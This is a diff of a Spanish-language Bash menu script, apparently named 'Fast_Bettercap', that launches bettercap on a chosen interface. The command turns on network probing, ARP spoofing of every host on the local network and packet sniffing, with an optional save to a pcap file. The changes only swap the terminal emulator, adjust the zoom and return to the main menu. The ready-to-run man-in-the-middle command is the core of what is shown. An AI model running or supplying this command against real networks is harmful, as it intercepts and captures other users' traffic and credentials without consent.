@@ -8,6 +8,7 @@
 #John-Wick
 
 
+
 BANNER() {
 	clear;echo;
 echo -e '\e[1;33m   -::-.`                                                   `...`     \e[0m'
@@ -193,7 +194,7 @@ done
 												echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
 												read SALIDA_FAST_BETTERCAP
 											done
-									gnome-terminal -t sniff_all --geometry=190x40 --zoom=0.7 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.output $SALIDA_FAST_BETTERCAP/sniff_all.pcap; set net.sniff.verbose false; net.sniff on" &&
+									gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.output $SALIDA_FAST_BETTERCAP/sniff_all.pcap; set net.sniff.verbose false; net.sniff on"&& clear; MENU_PRINCIPAL;
 										
 										sleep 1 ;echo;echo -e "\e[0;30m\e[42m[[[ Fast_Bettercap V0.2 ]]]\e[0m";echo;
 										echo -e "\e[0;34m[[[\e[1;32m0\e[0;34m]]]\e[0;37m Menu principal\e[0m"
@@ -211,7 +212,7 @@ done
 										esac 
 								 done 
 									;;
-								[n]* ) xfce4-terminal --geometry=193x40 -x bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on " && break
+								[n]* ) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on "&& clear; MENU_PRINCIPAL;
 									;;	
 									* ) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Solo escriba si/s/ no/n\e[0m";
 									;;
